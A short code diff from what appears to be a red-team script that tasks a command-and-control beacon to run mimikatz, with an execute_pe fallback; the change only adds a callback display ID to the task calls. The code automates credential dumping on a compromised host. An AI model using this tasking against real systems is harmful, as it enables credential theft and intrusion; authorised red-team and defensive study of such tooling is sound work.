@@ -54,10 +54,22 @@ async def run_mimikatz(
 
     task_response = None
     try:
-        task_response = await create_task(session, beacon_id=beacon_id, command_name="mimikatz", params=mimikatz_args)
+        task_response = await create_task(
+            session,
+            beacon_id=beacon_id,
+            callback_display_id=beacon_row["name"],
+            command_name="mimikatz",
+            params=mimikatz_args,
+        )
         print("[+] Submitted built-in mimikatz task")
     except RuntimeError:
-        task_response = await create_task(session, beacon_id=beacon_id, command_name="execute_pe", params=execute_pe_args)
+        task_response = await create_task(
+            session,
+            beacon_id=beacon_id,
+            callback_display_id=beacon_row["name"],
+            command_name="execute_pe",
+            params=execute_pe_args,
+        )
         print("[+] Built-in mimikatz unavailable; submitted execute_pe fallback")
 
     task_id = str(
